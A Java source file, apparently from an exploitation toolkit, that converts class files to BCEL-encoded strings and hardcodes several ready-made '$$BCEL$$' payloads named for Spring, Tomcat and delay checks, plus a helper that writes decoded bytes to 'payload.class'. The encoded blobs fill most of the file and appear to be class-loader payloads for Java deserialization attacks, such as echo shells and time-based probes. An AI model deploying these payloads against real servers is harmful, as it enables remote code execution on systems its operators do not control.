package cn.safe6.util;

import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.io.FileOutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class BCELEncode {

    public static String class2BCEL(String classFile) throws Exception{

        String result="";
        if(classFile.contains("Spring")) {
            result = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5VYS$UW$U$fe$$$M$d3M$d3$884$a0$b4h$e2$86$M$I3$891F$81$Y$R1$Y$W$8d$83$S$d0$yMs$81$86$99$ee$b1$bb$H1$8b$d9$ccf6$b3$99h$f6$a5$8ag_F$x$89$a9$a4$w$95$87$fc$86$fc$M$ab$8c$P$899wz$Gf$80$94$a9$ca$3c$dc$e5$dc$ef$9c$f3$9d$e5$de$9e$df$ff$fe$fe$t$A$3b$f1$8d$82r$ecS$d0$85$fdb$e8$96q$40A$P$O$caxXB$af$C$J$87$q$3c$a2$a0$P$fd2$Gd$M$ca8$y$e3$88$8cG$c5$d9Q$Zq$ZC$S$8e$J$c4q$Z$c32$kSP$83$RavT$c6$J$J$t$V$ac$c3$e32$9e$Q$f3$93bxJ$86$ncL$82$vc$5c$a0$b9$8c$J$F$93$98$S$hK$c6$b4$98gd$qd$qe$d82$i$F$v$9c$S$83$ab$c0$83$_$ac$a4$r$cc2$84$3b$z$db$f2$f72$94F$9a$8f3$84$ba$9dq$ceP$d5o$d9$7c0$9d$i$e3$ee$901$96$m$89$dci$sr$c8$ca$b8o$983$DF$w$7bDQJ8M1R$Q$c4H$c2$i$83$Sw$d2$ae$c9$PZB$b3$w$9er$z$7b$b2$c7$9cr$a2$d3$c6$ac$a1b$H$ee$93pF$c5$d3xF$c5$b3x$8e$a1$d3q$t$a3$5e$W7$e1$gI$7e$daqg$a2$a7$f9X$d4tl$9f$cf$f9Q$97$9fJs$cf$8f$k$N$e6$ee$40$dc$eb$q$c6$b9$x$e1$ac$8a$e7$f1$CC$ed$q$f7s$88$$$dfw$ad$b1$b4$cf$3db$m$dc$c6$S$86$3d$Z$ebN$Y$9e$a7$e2E$bc$c4$b0zQ$7cxl$9a$9b$3e$c5$a1$e2e$9cc$d8$f7_$f9$c4$b9$3b$9bX$d1iE$96$8b$97rl$8f$92$a0$y2c$d8$m$i$cfE$bd$40w$d1F$k$5cN$e0a$d7$f2$b9$ab$e2$V$c1$b4$b1Xa$ca$f7S$d1$5e$g$8a$bd$H$8a$bd$dc$a0$9c$UE$X$f7E$m$w$5e$c5kTa$3f$L$Nq$aa$87$8a$d7$f1$86$8a$f3x$93A$S$d1$fa$J$9b$a1$3a$ab$99$f6$adD$yn$g$b6$zh$ec$c0$5b$M$r$t$bbT$bc$8dwT$bc$8b$L$Me$T$89$b47E$b3$99p$E$ed$9aE$8f$3ds$sO$f9$96C$d6$a4$n$f2g$s$c7U$bc$87$f7i$ebxQ$9b2$w$e1$D$V$l$e2$p$V$X$85$ad$d2$e1C$83$w$3e$c6$t$b4$q0$f9$8a$99$E$8e$8dYvL$f8$ui$a3$ce$ba$a4$e22$3eU$f1$Z$3e$97$f0$85$8a$_$f1$95$60$f65C$83$e9$qc$T$86$e7O$7b$8e$j$9bM$T$f3$85$a6c$a8_$q$e6$f2$89$EU$3a6$c0$fd$v$87$dc$d4$9c$e8_$9a$a7$8e$a2$dc$NM$b9$94Pjz3$ed$ba$dc$f6$f3$fb$daHs$ffR$Ui$d6Q$Fr$cd$99m$b5$7e$t$a8$86$5e$E$_8$S$3a$x$kP5$T$b4$c8J$a8$D$o$cby$$$b3$d8$Rt$40$3e$b6$7d$x$e8$9cX$a6Sh$a58$3bd$$l$d9$b3$ce$M$d5vO$a1$ad$e0$b6$U$d9$ca$89$9a$97$8b$a8$9f$88$d3$Bn$s$M$97$8f$e7$b9Uz$dc$ef2M$eeyV$f6y$JEF$c5$f3$T$a6N6$S$Uo$dd$K$fe$9aG$e9$Z$S$f9$NRR$b3$3c$a5$jK$U$f3$89$o$cbj$da$e3$Hx$c2J$8ak$c5$d0$f4$ef$f9$yl$7c2$Y$b2$a9$96K$eb$bd$d0$v$92$e5$f5$qS$fe$99$ec$fb9Z$7c$eb$cex$3eO$G$P$c1$R$d7IqW$c0$b6$dd$a1$90$L$96$x$7c$e7X$8a$94$ba$Nq$b7d$f1$f0$Y$96Mq7$UZ$e8$9e2$dc$b8$b8$fe$b6$c9$b3$J$aa$5e$3c$3b$9a$b6$7d$x$99$7f$7c$f2$9b$ba$a2$40rb$R$t$9f$e3t$e5$o$91$VnD$a1$G$85$o$ca$d6Q$e4$w$tdXE$ae$O$d9$a9$b4O$9a$dc$a0$e8$d7$e6$ddYN$ac$e0$80$d4$eb$p$x$k4$l$c7$s$dcK_$3f$f1$x$B$T_$L$gw$d2n$D$cd$8c$e6$b2$96$ab$60Wh$c1p$3f$8d$e1$ac0$M$Z$bb$f2$d0$92$5bd$40$r$c0$adk$u$c9$a0T$LeP$d6$d7$a2$85K$afC$ca$40$ee$df$cehU$9e$812$90$DT$E$A5$Ph$d1$ws$cb$c1$ed$ad9l$7b$a8maY$96$d3$5bEzZU$A$5d$dd$k$ceI$ab$85T$L$91t$a4T$ab$89$8b$pI$97$88D$ad$k$OF$3d$94$b7$qku$ed$e5$ba$a4$97$R$bc$9c$e0k$I$ae$fc$8c$g$S$96ku$Z$ac$bd$8cq$5d$ce$a0$5e$d3$L$N$ear$80$ff$B$ebF$f4$f2$abh$d0$d6g$b0$n$83$bb$84$fap$a0pw$8e$97$$$e7$9c$e5$e4$h$97$c9$e7Q$d6$ae$e4$fc$5d$c2$_$Ft6$e7$e9$u$ba$92$c1$96$cb$f8$$$7c$9dv$V$da$d6kh$cc$60$9b$d6$94A$e4$S4$bd$a2Tk$8e$eb$V$n$ad$r$3e$8f$w$b1$dd$9e$dd$b6$d2X$a6$x$f1$3b$c4p$Nm$3a$V$n$9aA$ec$w$ee$f9$9f$c1$84$fa$aeP$ef$cc$b3$s$d6B$dd$Ev$83$dd$a4$b9$q$db$$$X$d1H$a3h$P$FkQAr$Vm$a8$c4n$acB7$aa0$88$d5$YA5$ih$f4e$ac$c1$F$d4$92N$j$be$c5$g$cc$a3$k$3fB$c7o$f4$ff$e9$s$gX$V$d6$b3$sl$q$_w$b1Vlb$bb$b0$99$f5a$L$8bc$x$hA$p$b3$b0$8d9hbshfg$d1$c2$ce$a1$95$9dG$h$fb$VQ$f6$Hb$ec$Gv$S$b3$j$ecOj$dd$H$88$d5$7e$c8$b7$c9$a0$oa$b7$84$3d$S$da$f3c$b0$I$d6$j$84$93$d0$c9$feB$lm$q$3cXq$9b$c8$o$90$8aK$b17$7bs$k$fa$H$fb$fd$5c$e4$a4$K$A$A";
        }
        if(classFile.contains("delay2")){
            result="$$BCEL$$$l$8b$I$A$A$A$A$A$A$AU$90$3dO$CA$Q$86$df$85$bb$5b8$40$Q$f0$3b$Wv$40$e15$96$c4F1$f1$bb$80$d0$_$cb$w$87w$b7$X8$88$ff$c8$9aJc$e1$P$b0$f2$X$Zg7F$e2$U3$bb$cf$bc3$3b$b3$9f$df$ef$l$AN$b0$ef$83c$d3$855$fe$e5$a3$8e$GG$93c$8bc$9b$c1$eb$86I$98$9d2$e4$5b$ed$n$83s$a6$c7$8a$a1z$T$s$ean$R$8f$d4l$mF$R$91BWF$bf$caJ$3f$T$f2$e9V$a46E$bd$Y$fc$be$5e$cc$a4$ba$I$8d$b4$3a$d0$b1$UYON$f4$f1T$yE$Z$F$U9v$ca$d8$c5$kC$c3$b0$m$S$c9c$d0$7b$96$w$cdB$9d0$iH$j$H$Pb$9eM$e7$3a$J$96$8b$uXwa$a8$adk$eeGS$r$b3$7fh0$99$v1fp$e7$91R$v$z$d1$baj$Pq$E$8f67$96$D3$p$90$f7$e9vH$91Qt$3b$af$60$x$3a0$94$c8$7b$W$e6IX$fe$93$9e$dbR$a0$d4D$ee$N$ce$L$9c$eb$95$F$kI$5cJ$9a$c2$3a$iK$M$x$d2$8b$3e$d1$8a$f9k$e4$$96L$ff$aa$j$a2$f6$Di$L$f7$99$94$B$A$A";
        }
        if(classFile.contains("delay4")){
            result="$$BCEL$$$l$8b$I$A$A$A$A$A$A$AU$8f$3dO$CA$Q$86$df$85$bb$5b8$c0C$c0$efX$d8$B$85$d7X$S$h$c5$c4$ef$CB$bf$y$ab$i$k$b7$e48$88$3f$c7$ce$9aJc$e1$P$f0G$Zg7F$e2$U3$b3$cf$bc3$3b$f3$f5$fd$f1$J$e0$E$fb$3e86$5dX$L$5e$7c$d4P$e7hplql3x$9d$u$89$b2S$86$7c$b35$60p$ce$f4H1$E7Q$a2$ee$W$d3$a1J$fbb$Y$T$vtd$fc$ab$ac$f42$n$9fn$c5$cc$96h$W$83$df$d3$8bT$aa$8b$c8H$83$be$9eJ$91u$e5X$lO$c4R$94Q$40$91c$a7$8c$5d$ec1$d4$N$Lc$91$3c$86$ddg$a9fY$a4$T$86$D$a9$a7$e1$83$98g$93$b9N$c2$e5$o$O$d7S$Y$aa$eb$9e$fb$e1D$c9$ec$l$ea$8fS$rF$M$ee$3cVjFG4$afZ$D$i$c1$a3$cb$8d$e5$c0$cc$K$e4$7dz$jRd$U$dd$f6$h$d8$8a$S$86$Sy$cf$c2$3c$J$cb$7f$d2s$db$K$94$g$c8$bd$c3y$85s$bd$b2$c0$p$89KE$d3X$83c$89aE$fa$d1$tZ$n$c2$91$bb$e4$d80$f3$D$bbD$f5$H$d5$b5n$8d$94$B$A$A";
        }
        if(classFile.contains("Tomcat")){
            result="$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be$f9$be$f7$7b$ef$f7$f7$be3y$fc$e2$p$a7$A$dc$80$7f$89$Q1$m$60P$84$PI$b6h$Cv$f3$Y$e2$91$f2$a3$E$c3$8c$a4$f30x$8c$88t$de$p$c2D$9a$JY$C2$ecr$_$8fQ$B$fb$E$ec$e7q$80$R$5e$c3$e3$b5$ec$f9$3a$R$d5$b8S$c4$5dx$3d$5b$de$m$e2$8dx$T$5b$O$K$b8$5bD7$de$cc$e3$z$ec$fcV$Bo$T$d1$84C$C$de$$$e0$j$3c$de$v$e0$5d$C$ee$R$f0n$k$f7$Kx$P$8f$f7$96$a0$B$efc$cb$fb$F$dc$t$e0$D$C$ee$e71$s$e00$T$bc$93$z$P$I$f8$a0$80$P$J$f8$b0$80$8f$88$f8$u$3e$c6$a8G$E$7c$5c$c0$t$E$3c$u$e0$93$C$b2$3c$3e$c5$e3$d3$o6$e03l$f9$ac$88$cf$e1$f3$o$d6$e3$L$C$be$c8$9eG$d9r$8c$89$3e$c4$7c$fc$S$d3$f4$b0$88$_$p$c7c$9c$83o$b5$a6k$d6Z$O$eeP$dd$z$i$3cmFB$e5P$d6$a5$e9jOf$b8_5$7b$e5$fe$UQ$fc$a3$a6f$a9$adFb$3f$879$a1$ae$dd$f2$5e9$9a$92$f5$c1$e8$d6$fe$dd$aab$b5$f4$b52$f1$d2$98$r$xC$dd$f2$88$zE$89$a4$U$da$b9$k$e2$m$b6$efS$d4$RK3$f44$H$ef$a0ju$90$c0$ca$o$aa$K$u1$cb$d4$f4$c1$96$ba$x$99xLPY8$I$ab$95$94$j$B$8f$e3$94$40$ca$_$r$97$c7$pd$_fdLE$ed$d0$98$fbe$bd$c6$b0$o$5b$edJ$d2$880$5d$Sz$b0$95C$ada$OF$e4$RYI$aa$R$cb$e6$88d$y$z$V$e9$cf$MDZ$f7$5bj$5b2$a3$PI8$81$afH8$89Sd$$$adZ$ec$82B$u$9b$f2$a9$z$r$a7$89$e2$eak$95p$gg$q$3c$8a$afr$u$9f$e94$87$8a$vR$a7n$a9$83$aa$c9$i$f9$g$8f$afK$f8$G$ceJx$M$e78$f0$Jc$H$cb$b6$84o2$3d$8bf$Y$ea1$ac$O$p$a3$t$$$e7$93C$rc$89$e8$9aa$7b$dd$9a$Z$YPM$w$e6$a8$v$8fpX8$r$dfc$c42J$b2$5b$b5$92$c6$94$b8$84$c7$f1$z$O$Lf$b2uhj$aa$90$eb$db8$c7$bc$7d$82R$_$e1$3b$f8$ae$84$ef$e1$fb$94v$JO$e2$H$S$7e$88$l$91$ebV$d2T$e5DZ$c2N$f4$91_$7d$F$95$eb$b5$afZ$q$fc$YO$91s$ea$3eU$91$f0$T$fc$94$f6I$cb$oG$7d$96l$S$$8$E$a6$84$b6gt$ddA$a0$cfJj$e9$da$eb$c8FR$d6$T$v$W$a0o0e$f4$cb$a9$7c$fc$8e$40AV$c4$R$d3P$d4t$da0$a98$b3l$WV$ddh$97$96$b6$q$fc$MO$b3$I$7eN$d07$d5$3d$iJ$c8$f4v5$3dB$f8dx$a7$d3fr$97$99$v$9f$JH$c2A$af$9a$b6TB$93$84_$e0$Zb$t$5c$Q$f6$ad$MY$f2$cb$89$c4$a4$u$cf$f8$94$e1$E$ed$8ctD$97$87$a9$v$7e$v$e1Y$fcJ$c2$afY$g$7c$a3$9a$9e0F$e9$9e$b8$o$94$T$82QT$a1c$b4_$d3$a3$e9$q$j$c3$ca$qpl$efc$8a$ac$ebLw$cd$94$5b$db$9c$40$5b3Z$w$e1$60$ea7$S$7e$8b$df$f1$f8$bd$84$3f$e0$8f$8c$f2$tR$b5k$83$84$e7p$5e$c2$9f$f1$94$84$bf$e0$af$S$b6$p$s$e1o$f8$3b$8f$7fH$f8$tsi$9eb$MG$H$e4$b4$b5$3bm$e8$d1$bd$99Tt$aay$a8$f9$a7$ac$9a$ea$40$8a$60$j$b5$812$zMN$a9g$d4$3f$df$cc$U$db$80a$f6P$w8$y$J$fd$f7f$b7$f1N$S$r$ba$3a$da$a9$a7$zYWHjv$a8$c8$40$m$U$f5$c6$b7$b5S$aa$8a$c8WP57$aaJJ6$d5$84$83$7e$O$eb$8b$d8$ee$bbB$b6$d0$d2d$bc$8e$Gf1$d4$c9$a6$5e$cd$cb$b1Py5$7d$af1D$3e$af$w63$af$q$V$NL$m$ef$f3$p$a62T$y$3d$M$ac$93$W$cb$LB$cd$X$s$7c$95$yO$ab$p$a9$x$r$V$b1$cc$88j$w$8e$d1$aab$f2l$da$T$e87$u$Mx$9a$dd$a1$9e$d0NFv$db$3d$bc$b4H$c0E$a3$xU2$a6$a9$ea$d6$qf$a6W7$3f4$a8$7fI$abs$d8d$g$Z$9a$W$c1$o$7c$f6$VC$Y1$3b$I$9b$ae$ed2$E$F$c5$d0$zYc$af$a2y$85$8e$b6$re3$a6$ee$c9$a8$E$b4$96$ba$9d$USZ$3b$a0$dao$c7N$96$88$ce$a2$n$f0Z$ba$7dx$c4$dao$f3$ed$9c$3e0$f6$d3$9c$Yv$a6$Lu$v$r$95$b1$z$bdJE$$$fbYb$Z$5d$c6$a8j$b6$c9l$uU$87$8a$f4$TK$b9$97Z$c3$b4$98$83$85Z$f2S$a1e$da$7b$tOt$S$da$a9$8fdhnQ$ea$86$d9k$3d$_$ac$Z$d1$82$L$S$af$J$V$bd$60$96$a5LZ$dd$a8$a6$b4az_$d1LZ$f6$f2$81$V$O$_$d6$3b$ba$ba$cfr$b0$9d$7f$a1zBu$7d$ad$O$fa$f2$99$d2$Y$b9$sT$a8$60$ea$86t$cc$$F$t$9d$96$e1$98$c6b$fa$e2$R$c1$7e$3c$e0$d8$x$9f$d6mt$ba$86$9e$i$3d$bd$f5$e3$e0$8e$d1$86$c3$cd$b4$fa$i$o$89$d0T$84$8b$b1r$a3$f4$91$e8$r$ea$8b$B$d7$E$dc$3d$e1$i$3c$dd$e1$80$d7w$S$be$b8$3b$c0$c7$e2$9e$87$m$c4$e2$5e$b6$e6$e0o$f4$9e$84$Yw7$Q$dd$d9$9d$40I$dc$3d$O$89$Il$dbp$8a$ed$89$b3tG$7d$O$b3$Ce$k$5bQ$98$u$e5$f5$k$5b$a2$d1$be$cd$e2P$b3$t$Q$b0m$G$w$3d$93$e6$c8D$d8$937Al$ddWS$d2$fe$ff$x9F$99$A$M$faN$ae$b0$9f$e3$98M$U$96$af$b5$u$a3$b5$83$f2$b6$89$b2$b4$99h$9dt$bf$9d8o$82$85$z8$80$$$dcG$rx$98h$e3$94$fe$e3T$80$d3$94$d5$a7$89$f3$F$f4$d2$_0$H$ee$e7a$f2x$d5$f3$d8$c8$e3$96$L$d8$c0c$H$8f$5b$R$cfW$ad$8e$caA$l$TN9$f0$A$dcv9Vr$b6$d7$U$96$f8$m$aa$c3$N9TugQ$da$ec$a1$C$cd$e9$c9$5ez$ae$f11H$tP$jo$YG$cd$e9FO$O$c1F$S$98$7b$944$96$a2$92$be$e4$ab$f3A$y$87D$eb$O$3a$dd$K$9e$y$95b$X$dd$dfF$f7$afF$Nn$t$ac$dc$81EPP$8b$E$c2$Y$m$feA$db$f1$Kx$$$80$e7$b1$8b$9c$ed$e1q$9b_$wpY$m$e1$3c$d8$dc$s$9dJ$A$d7$cd$ee$96$J$cc$cba$7e$e0$9a$J$y8$83$85$f4$d7$e5$5e3$bf$e1$d4$R$d7$f5$N$f3$97$f7$84$cf$ba$96$90$fb$8b$9a$3dAO$60q$O$d7$kvU$d1$ee$V$b4$hs$95$84$D$b5$q$d6$ec$Nz$l$c5$921$ee$a5$a07$b0$94$I$81el$J$d9WY$I$cd$be$y$f7$y$5d$d5$db$s$g$9a$7d$ee$V$7c$V$l$f4$jG$p$87$p$dc$a9$a0$af$8a$3f$8e$b0$L$cdBP$ID$f2$gY$fd$a3n$aa$3f$d5$3e$e8$a5$8dH$85o$f6$3b$X$d7$e5q$d3$U$b3o$3dyX7$c5$D$cb$c7q$3d$83$c8$Z41$9f$cfb$uH$89$be$e10$94$a0$9fI$be$d2$91tZ$a3$3c$e8$f7$5c$ee$88$K$9cc$7d$c0$e0$e5$b0$ae$f0N$g$89$7b$f2$96$fc$de$Z$96$e2d$c3$W$f1$b4$5c$cd$b3$hgz6$96$f7$ec$de$ff$c1$b3$c0$ca$J$ac$ca$a19$d0$c2$w$80$m$f5$7c$TY$5b$cd$5c$5cC$zO$dedQ$9d$a7$aee$d4u$O$b5Y$M$faO$60$7d$fc$E6$c4$83$e28Zsh$cba$e38$da$D$j9l$caas$O$9d$T$b8$89$e2$m$d7Jl$d7$c6P5w$M$VA$ff$E$b6$e4$d0$e50$Q$c5$97$85$ff$m$cfe$_$ae$9e$3c$b8$b8$ec$85$t$b2$f0la$8d$d9$D$99pYG$f0$earm$a5$a7$83$e9$p$I$d1$w$d0$c9O$cdZ$82$f9$84$f1E$84$ecZ$ccB$3d5$edZ$94S$dbV$90t$r$c9W$93$86$d9$84$ec$wh$84$f8$M$e6$e2$m$e6$e1$k$92$ba$9f$d0$7f$M$L$f0$M$W$e2$3c$Wq$d5X$ccu$e2Zn$L$96p$fb$b0$94$bb$h$cb$b8$a3$Iq$e7Q$e7$aa$40$bd$ab$92$90U$8b$88k9$9a$5c$x$b0$dc$b5$Ks$5d$eb$b0$c2$d5$86$h$5d$j$uqua$jy$b9$c6$b5$8d$feU$ed$b5$bb$ae$fc$o$aa9$k$L$b9K4$t$7c$f6$8e$c7$ed$3c$ee$a0$v$A$da$ca$d4d$b3x$f4s$X$f0$a4$3d$Yv$bc$84C$dby$uuR$c5$L$f0$bd$I$ef$r$g$3fn$5b$Q$f87$bc$ad$q$c3$e6y$82$d4$bb$a0$fe$H$d8$3e$ebc$Z$Q$A$A";
        }
        if(!result.isEmpty()) {
            return result;
        }
        Path path = Paths.get(classFile);
        byte[] bytes = Files.readAllBytes(path);
        result = Utility.encode(bytes,true);
        return result;
    }
    public static String class2BCEL(byte[] clazzByte)throws Exception{
        String result = Utility.encode(clazzByte,true);
        return result;
    }

    public static void decode(String str) throws Exception{
        byte[] s =  Utility.decode(str,true);
        FileOutputStream fos = new FileOutputStream("payload.class");
        fos.write(s);
        fos.close();
    }

    public static void main(String[] args) throws Exception {

        //System.out.println("$$BCEL$$"+BCELEncode.class2BCEL(System.getProperty("user.dir") +"SpringEcho.class"));

       // BCELEncode.decode(class2BCEL("Tomcat"));

    }

}
